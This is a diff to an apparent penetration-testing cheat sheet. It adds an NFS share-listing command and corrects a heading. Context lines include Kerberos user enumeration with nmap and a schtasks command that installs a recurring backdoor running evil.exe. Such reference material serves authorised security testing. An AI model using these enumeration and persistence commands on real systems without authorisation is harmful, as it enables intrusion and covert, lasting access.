@@ -35,6 +35,10 @@ curl -vX $TARGET
 nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test'
 ```
 
+#### NFS Exported Shares
+```bash
+showmount -e 192.168.110.102
+```
 
 #### HTTP Brute-Force & Vulnerability Scanning
 ```bash
@@ -355,7 +359,7 @@ find /etc -iname *.conf
 ```
 
 ## Maintaining Access
-#### Persisten BackDoors
+#### Persistent Back Doors
 ```
 # Launch evil.exe every 10 minutes
 schtasks /create /sc minute /mo 10 /tn "TaskName" /tr C:\Windows\system32\evil.exe
